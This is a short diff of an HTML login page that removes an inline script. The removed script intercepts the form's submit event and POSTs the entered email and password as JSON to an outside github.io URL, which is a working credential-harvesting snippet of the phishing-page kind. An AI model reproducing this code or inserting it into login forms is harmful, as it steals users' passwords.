@@ -28,22 +28,6 @@
         <div class="signup-link">Not a member? <a href="#">Signup here</a>
         </div>
       </form>
-      <script>
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-          e.preventDefault();
-          const formData = new FormData(e.target);
-          const data = {
-            email: formData.get('email'),
-            password: formData.get('password'),
-          };
-
-        await fetch('https://grimmypigeon.github.io/namesogames/?#', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data),
-          });
-        });
-      </script>
     </div>
   </div>
 </body>
